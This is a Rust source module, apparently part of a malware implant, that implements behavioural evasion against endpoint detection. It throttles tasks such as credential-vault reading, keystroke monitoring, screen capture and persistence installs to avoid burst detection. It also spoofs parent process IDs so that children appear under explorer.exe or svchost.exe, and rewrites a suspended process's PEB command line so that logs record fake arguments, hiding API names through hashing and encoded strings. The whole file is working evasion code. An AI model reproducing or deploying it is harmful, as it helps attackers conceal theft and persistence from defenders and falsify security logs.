/// Behavioral evasion: PPID spoofing, argument spoofing, task throttling.
/// Feature-gated behind `evasion`.

use std::sync::Mutex;
use std::time::Instant;

// ============================================================================
// A. Task Throttler
// ============================================================================

/// Throttles sensitive task execution to avoid burst detection by EDR.
pub struct TaskThrottler {
    last_sensitive_task: Mutex<Option<Instant>>,
    min_delay_ms: u64,
}

impl TaskThrottler {
    pub const fn new(min_delay_ms: u64) -> Self {
        TaskThrottler {
            last_sensitive_task: Mutex::new(None),
            min_delay_ms,
        }
    }

    /// Check if enough time has passed since the last sensitive operation.
    pub fn should_execute(&self, task_type: &str) -> bool {
        if !is_sensitive(task_type) {
            return true;
        }
        let last = self.last_sensitive_task.lock().unwrap();
        if let Some(t) = *last {
            t.elapsed().as_millis() as u64 >= self.min_delay_ms
        } else {
            true
        }
    }

    /// Record that a sensitive task was executed.
    pub fn record_execution(&self, task_type: &str) {
        if is_sensitive(task_type) {
            *self.last_sensitive_task.lock().unwrap() = Some(Instant::now());
        }
    }
}

/// Determine if a task type is "sensitive" (triggers more EDR scrutiny).
fn is_sensitive(task_type: &str) -> bool {
    matches!(
        task_type,
        "vault_reader"
            | "input_monitor_start"
            | "input_monitor_dump"
            | "display_capture"
            | "config_store_read"
            | "boot_entries_add"
            | "service_manager_install"
            | "network_scan"
    )
}

// Global throttler instance: minimum 30 seconds between sensitive operations.
// Use once_cell since Mutex::new is not const-stable for Option<Instant>.
static GLOBAL_THROTTLER: once_cell::sync::Lazy<TaskThrottler> =
    once_cell::sync::Lazy::new(|| TaskThrottler::new(30_000));

/// Get the global task throttler.
pub fn throttler() -> &'static TaskThrottler {
    &GLOBAL_THROTTLER
}

// ============================================================================
// B. Parent PID Spoofing (Windows only)
// ============================================================================

#[cfg(all(target_os = "windows", feature = "evasion"))]
mod win {
    use crate::utils::strings::{self, d_cstr};
    use crate::utils::evasion;
    use std::ptr;

    // Win32 constants
    const PROCESS_ALL_ACCESS: u32 = 0x001F0FFF;
    const EXTENDED_STARTUPINFO_PRESENT: u32 = 0x00080000;
    const CREATE_SUSPENDED: u32 = 0x00000004;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
    const TH32CS_SNAPPROCESS: u32 = 0x00000002;
    const STARTF_USESHOWWINDOW: u32 = 0x00000001;
    const INFINITE: u32 = 0xFFFFFFFF;

    // Type aliases
    type FnGetProcAddress = unsafe extern "system" fn(isize, *const u8) -> *const ();
    type FnGetModuleHandleA = unsafe extern "system" fn(*const u8) -> isize;
    type FnOpenProcess = unsafe extern "system" fn(u32, i32, u32) -> isize;
    type FnCloseHandle = unsafe extern "system" fn(isize) -> i32;
    type FnCreateToolhelp32Snapshot = unsafe extern "system" fn(u32, u32) -> isize;

    // PROCESSENTRY32 is 568 bytes on x64
    #[repr(C)]
    struct ProcessEntry32 {
        dw_size: u32,
        cnt_usage: u32,
        th32_process_id: u32,
        th32_default_heap_id: usize,
        th32_module_id: u32,
        cnt_threads: u32,
        th32_parent_process_id: u32,
        pc_pri_class_base: i32,
        dw_flags: u32,
        sz_exe_file: [u8; 260],
    }

    #[repr(C)]
    struct StartupInfoExA {
        startup_info: StartupInfoA,
        attribute_list: *mut u8,
    }

    #[repr(C)]
    struct StartupInfoA {
        cb: u32,
        reserved: *const u8,
        desktop: *const u8,
        title: *const u8,
        x: u32,
        y: u32,
        x_size: u32,
        y_size: u32,
        x_count_chars: u32,
        y_count_chars: u32,
        fill_attribute: u32,
        flags: u32,
        show_window: u16,
        cb_reserved2: u16,
        reserved2: *const u8,
        std_input: isize,
        std_output: isize,
        std_error: isize,
    }

    #[repr(C)]
    struct ProcessInformation {
        process: isize,
        thread: isize,
        process_id: u32,
        thread_id: u32,
    }

    /// Find the PID of a process by name (e.g., "explorer.exe").
    pub unsafe fn find_process_pid(target_name: &str) -> Option<u32> {
        let api = crate::utils::evasion::syscall_table(); // just to verify we have API access
        let _ = api;

        // Resolve kernel32 functions
        use crate::utils::api_hash::*;
        let get_module_handle_a: FnGetModuleHandleA =
            resolve(H_KERNEL32, H_GET_MODULE_HANDLE_A)?;
        let get_proc_address: FnGetProcAddress =
            resolve(H_KERNEL32, H_GET_PROC_ADDRESS)?;

        let kernel32_name = d_cstr(strings::S_KERNEL32_DLL);
        let kernel32 = get_module_handle_a(kernel32_name.as_ptr());
        if kernel32 == 0 { return None; }

        let snapshot_fn: FnCreateToolhelp32Snapshot = {
            let name = d_cstr(strings::S_CREATE_TOOLHELP32_SNAPSHOT);
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return None; }
            std::mem::transmute(ptr)
        };
        let process32_first: unsafe extern "system" fn(isize, *mut ProcessEntry32) -> i32 = {
            let name = d_cstr(strings::S_PROCESS32_FIRST);
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return None; }
            std::mem::transmute(ptr)
        };
        let process32_next: unsafe extern "system" fn(isize, *mut ProcessEntry32) -> i32 = {
            let name = d_cstr(strings::S_PROCESS32_NEXT);
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return None; }
            std::mem::transmute(ptr)
        };
        let close_handle: FnCloseHandle = {
            let name = b"CloseHandle\0";
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return None; }
            std::mem::transmute(ptr)
        };

        let snapshot = snapshot_fn(TH32CS_SNAPPROCESS, 0);
        if snapshot == -1 { return None; }

        let mut entry: ProcessEntry32 = std::mem::zeroed();
        entry.dw_size = std::mem::size_of::<ProcessEntry32>() as u32;

        if process32_first(snapshot, &mut entry) != 0 {
            loop {
                let name_end = entry.sz_exe_file.iter().position(|&b| b == 0).unwrap_or(260);
                let name = std::str::from_utf8(&entry.sz_exe_file[..name_end]).unwrap_or("");
                if name.eq_ignore_ascii_case(target_name) {
                    close_handle(snapshot);
                    return Some(entry.th32_process_id);
                }
                if process32_next(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }
        close_handle(snapshot);
        None
    }

    /// Find explorer.exe PID.
    pub unsafe fn find_explorer_pid() -> u32 {
        let name = strings::d(strings::S_EXPLORER_EXE);
        find_process_pid(&name).unwrap_or(0)
    }

    /// Find svchost.exe PID.
    pub unsafe fn find_svchost_pid() -> u32 {
        let name = strings::d(strings::S_SVCHOST_EXE);
        find_process_pid(&name).unwrap_or(0)
    }

    /// Create a process with a spoofed parent PID.
    /// The new process appears as a child of the specified parent in the process tree.
    pub unsafe fn create_process_spoofed(cmd: &str, parent_pid: u32) -> Result<String, String> {
        use crate::utils::api_hash::*;
        let get_module_handle_a: FnGetModuleHandleA =
            resolve(H_KERNEL32, H_GET_MODULE_HANDLE_A)
                .ok_or_else(|| "Failed to resolve GetModuleHandleA".to_string())?;
        let get_proc_address: FnGetProcAddress =
            resolve(H_KERNEL32, H_GET_PROC_ADDRESS)
                .ok_or_else(|| "Failed to resolve GetProcAddress".to_string())?;

        let kernel32_name = d_cstr(strings::S_KERNEL32_DLL);
        let kernel32 = get_module_handle_a(kernel32_name.as_ptr());
        if kernel32 == 0 { return Err("Failed to get kernel32".to_string()); }

        // Resolve needed functions
        let open_process: FnOpenProcess = {
            let name = d_cstr(strings::S_OPEN_PROCESS);
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return Err("Failed to resolve OpenProcess".to_string()); }
            std::mem::transmute(ptr)
        };

        type FnInitAttrList = unsafe extern "system" fn(*mut u8, u32, u32, *const (), *mut usize) -> i32;
        let init_attr_list: FnInitAttrList = {
            let name = d_cstr(strings::S_INIT_PROC_THREAD_ATTR_LIST);
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return Err("Failed to resolve InitializeProcThreadAttributeList".to_string()); }
            std::mem::transmute(ptr)
        };

        type FnUpdateAttr = unsafe extern "system" fn(*mut u8, u32, usize, *const isize, usize, *const (), *const ()) -> i32;
        let update_attr: FnUpdateAttr = {
            let name = d_cstr(strings::S_UPDATE_PROC_THREAD_ATTR);
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return Err("Failed to resolve UpdateProcThreadAttribute".to_string()); }
            std::mem::transmute(ptr)
        };

        type FnCreateProcessA = unsafe extern "system" fn(
            *const u8, *mut u8, *const u8, *const u8, i32, u32,
            *const u8, *const u8, *const StartupInfoExA, *mut ProcessInformation,
        ) -> i32;
        let create_process: FnCreateProcessA = {
            let name = d_cstr(strings::S_CREATE_PROCESS_A);
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return Err("Failed to resolve CreateProcessA".to_string()); }
            std::mem::transmute(ptr)
        };

        let close_handle: FnCloseHandle = {
            let name = b"CloseHandle\0";
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return Err("Failed to resolve CloseHandle".to_string()); }
            std::mem::transmute(ptr)
        };

        type FnWaitForSingleObject = unsafe extern "system" fn(isize, u32) -> u32;
        let wait_fn: FnWaitForSingleObject = {
            let name = b"WaitForSingleObject\0";
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return Err("Failed to resolve WaitForSingleObject".to_string()); }
            std::mem::transmute(ptr)
        };

        // Open the parent process
        let parent_handle = open_process(PROCESS_ALL_ACCESS, 0, parent_pid);
        if parent_handle == 0 || parent_handle == -1 {
            return Err(format!("Failed to open parent process {}", parent_pid));
        }

        // Initialize attribute list
        let mut attr_size: usize = 0;
        init_attr_list(ptr::null_mut(), 1, 0, ptr::null(), &mut attr_size);

        let mut attr_list = vec![0u8; attr_size];
        if init_attr_list(attr_list.as_mut_ptr(), 1, 0, ptr::null(), &mut attr_size) == 0 {
            close_handle(parent_handle);
            return Err("Failed to initialize attribute list".to_string());
        }

        // Set parent process attribute
        if update_attr(
            attr_list.as_mut_ptr(),
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &parent_handle as *const isize,
            std::mem::size_of::<isize>(),
            ptr::null(),
            ptr::null(),
        ) == 0 {
            close_handle(parent_handle);
            return Err("Failed to update thread attribute".to_string());
        }

        // Prepare startup info
        let mut si: StartupInfoExA = std::mem::zeroed();
        si.startup_info.cb = std::mem::size_of::<StartupInfoExA>() as u32;
        si.startup_info.flags = STARTF_USESHOWWINDOW;
        si.startup_info.show_window = 0; // SW_HIDE
        si.attribute_list = attr_list.as_mut_ptr();

        let mut pi: ProcessInformation = std::mem::zeroed();
        let mut cmd_bytes: Vec<u8> = cmd.as_bytes().to_vec();
        cmd_bytes.push(0);

        let result = create_process(
            ptr::null(),
            cmd_bytes.as_mut_ptr(),
            ptr::null(),
            ptr::null(),
            0,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
            ptr::null(),
            ptr::null(),
            &si,
            &mut pi,
        );

        close_handle(parent_handle);

        if result == 0 {
            return Err("CreateProcess failed".to_string());
        }

        // Wait for the process to complete
        wait_fn(pi.process, INFINITE);

        close_handle(pi.thread);
        close_handle(pi.process);

        Ok(format!("Process completed (PID: {})", pi.process_id))
    }

    /// Create a process with fake command-line arguments.
    /// EDR/Sysmon logs show fake_cmd, actual execution uses real_cmd.
    pub unsafe fn create_process_with_fake_args(
        real_cmd: &str,
        fake_cmd: &str,
    ) -> Result<String, String> {
        use crate::utils::api_hash::*;
        let get_module_handle_a: FnGetModuleHandleA =
            resolve(H_KERNEL32, H_GET_MODULE_HANDLE_A)
                .ok_or_else(|| "resolve failed".to_string())?;
        let get_proc_address: FnGetProcAddress =
            resolve(H_KERNEL32, H_GET_PROC_ADDRESS)
                .ok_or_else(|| "resolve failed".to_string())?;

        let kernel32_name = d_cstr(strings::S_KERNEL32_DLL);
        let kernel32 = get_module_handle_a(kernel32_name.as_ptr());
        if kernel32 == 0 { return Err("kernel32 not found".to_string()); }

        type FnCreateProcessA = unsafe extern "system" fn(
            *const u8, *mut u8, *const u8, *const u8, i32, u32,
            *const u8, *const u8, *const StartupInfoA, *mut ProcessInformation,
        ) -> i32;
        let create_process: FnCreateProcessA = {
            let name = d_cstr(strings::S_CREATE_PROCESS_A);
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return Err("resolve CreateProcessA failed".to_string()); }
            std::mem::transmute(ptr)
        };

        let close_handle: FnCloseHandle = {
            let name = b"CloseHandle\0";
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return Err("resolve CloseHandle failed".to_string()); }
            std::mem::transmute(ptr)
        };

        type FnResumeThread = unsafe extern "system" fn(isize) -> u32;
        let resume_thread: FnResumeThread = {
            let name = d_cstr(strings::S_RESUME_THREAD);
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return Err("resolve ResumeThread failed".to_string()); }
            std::mem::transmute(ptr)
        };

        type FnWaitForSingleObject = unsafe extern "system" fn(isize, u32) -> u32;
        let wait_fn: FnWaitForSingleObject = {
            let name = b"WaitForSingleObject\0";
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return Err("resolve WaitForSingleObject failed".to_string()); }
            std::mem::transmute(ptr)
        };

        // Resolve ntdll NtQueryInformationProcess for PEB access
        let ntdll_name = d_cstr(strings::S_NTDLL_DLL);
        let ntdll = get_module_handle_a(ntdll_name.as_ptr());

        type FnNtQueryInformationProcess = unsafe extern "system" fn(
            isize, u32, *mut u8, u32, *mut u32,
        ) -> i32;
        let nt_query: Option<FnNtQueryInformationProcess> = if ntdll != 0 {
            let name = d_cstr(strings::S_NT_QUERY_INFO_PROCESS);
            let ptr = get_proc_address(ntdll, name.as_ptr());
            if !ptr.is_null() { Some(std::mem::transmute(ptr)) } else { None }
        } else {
            None
        };

        type FnReadProcessMemory = unsafe extern "system" fn(
            isize, *const u8, *mut u8, usize, *mut usize,
        ) -> i32;
        let read_mem: FnReadProcessMemory = {
            let name = d_cstr(strings::S_READ_PROCESS_MEMORY);
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return Err("resolve ReadProcessMemory failed".to_string()); }
            std::mem::transmute(ptr)
        };

        type FnWriteProcessMemory = unsafe extern "system" fn(
            isize, *mut u8, *const u8, usize, *mut usize,
        ) -> i32;
        let write_mem: FnWriteProcessMemory = {
            let name = d_cstr(strings::S_WRITE_PROCESS_MEMORY);
            let ptr = get_proc_address(kernel32, name.as_ptr());
            if ptr.is_null() { return Err("resolve WriteProcessMemory failed".to_string()); }
            std::mem::transmute(ptr)
        };

        // 1. Create process suspended with fake command line
        let mut si: StartupInfoA = std::mem::zeroed();
        si.cb = std::mem::size_of::<StartupInfoA>() as u32;
        si.flags = STARTF_USESHOWWINDOW;
        si.show_window = 0;

        let mut pi: ProcessInformation = std::mem::zeroed();
        let mut fake_bytes: Vec<u8> = fake_cmd.as_bytes().to_vec();
        fake_bytes.push(0);

        let result = create_process(
            ptr::null(),
            fake_bytes.as_mut_ptr(),
            ptr::null(),
            ptr::null(),
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            ptr::null(),
            ptr::null(),
            &si,
            &mut pi,
        );

        if result == 0 {
            return Err("CreateProcess (suspended) failed".to_string());
        }

        // 2. If we can access the PEB, overwrite command line with real_cmd
        if let Some(nt_query_fn) = nt_query {
            // PROCESS_BASIC_INFORMATION: 6 * 8 bytes on x64
            let mut pbi = [0u8; 48];
            let mut ret_len: u32 = 0;
            let status = nt_query_fn(
                pi.process,
                0, // ProcessBasicInformation
                pbi.as_mut_ptr(),
                48,
                &mut ret_len,
            );

            if status == 0 {
                // PebBaseAddress is at offset 8 in PROCESS_BASIC_INFORMATION
                let peb_addr = *(pbi.as_ptr().add(8) as *const usize);

                // ProcessParameters is at offset 0x20 in PEB (x64)
                let mut params_addr: usize = 0;
                let mut bytes_read: usize = 0;
                read_mem(
                    pi.process,
                    (peb_addr + 0x20) as *const u8,
                    &mut params_addr as *mut usize as *mut u8,
                    8,
                    &mut bytes_read,
                );

                if params_addr != 0 {
                    // CommandLine UNICODE_STRING is at offset 0x70 in RTL_USER_PROCESS_PARAMETERS
                    // Write the real command as UTF-16LE
                    let real_wide: Vec<u16> = real_cmd.encode_utf16().chain(std::iter::once(0)).collect();
                    let real_bytes: Vec<u8> = real_wide.iter().flat_map(|w| w.to_le_bytes()).collect();

                    // Read current Buffer pointer from CommandLine.Buffer (offset 0x78)
                    let mut cmd_buffer_addr: usize = 0;
                    read_mem(
                        pi.process,
                        (params_addr + 0x78) as *const u8,
                        &mut cmd_buffer_addr as *mut usize as *mut u8,
                        8,
                        &mut bytes_read,
                    );

                    if cmd_buffer_addr != 0 {
                        let mut bytes_written: usize = 0;
                        // Write real command to the buffer
                        write_mem(
                            pi.process,
                            cmd_buffer_addr as *mut u8,
                            real_bytes.as_ptr(),
                            real_bytes.len(),
                            &mut bytes_written,
                        );

                        // Update Length field (offset 0x70, USHORT)
                        let new_len = (real_bytes.len() - 2) as u16; // exclude null terminator
                        write_mem(
                            pi.process,
                            (params_addr + 0x70) as *mut u8,
                            &new_len as *const u16 as *const u8,
                            2,
                            &mut bytes_written,
                        );
                    }
                }
            }
        }

        // 3. Resume the suspended process
        resume_thread(pi.thread);

        // 4. Wait for completion
        wait_fn(pi.process, INFINITE);

        close_handle(pi.thread);
        close_handle(pi.process);

        Ok(format!("Process completed (PID: {})", pi.process_id))
    }
}

// ============================================================================
// Public API
// ============================================================================

/// Create a process with a spoofed parent PID (Windows + evasion only).
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn create_process_spoofed(cmd: &str, parent_pid: u32) -> Result<String, String> {
    unsafe { win::create_process_spoofed(cmd, parent_pid) }
}

/// Create a process with fake command-line arguments (Windows + evasion only).
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn create_process_with_fake_args(real_cmd: &str, fake_cmd: &str) -> Result<String, String> {
    unsafe { win::create_process_with_fake_args(real_cmd, fake_cmd) }
}

/// Find explorer.exe PID.
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn find_explorer_pid() -> u32 {
    unsafe { win::find_explorer_pid() }
}

/// Find svchost.exe PID.
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn find_svchost_pid() -> u32 {
    unsafe { win::find_svchost_pid() }
}

// No-op stubs for non-Windows / non-evasion builds
#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn create_process_spoofed(_cmd: &str, _parent_pid: u32) -> Result<String, String> {
    Err("PPID spoofing not available on this platform".to_string())
}

#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn create_process_with_fake_args(_real_cmd: &str, _fake_cmd: &str) -> Result<String, String> {
    Err("Argument spoofing not available on this platform".to_string())
}

#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn find_explorer_pid() -> u32 { 0 }

#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn find_svchost_pid() -> u32 { 0 }
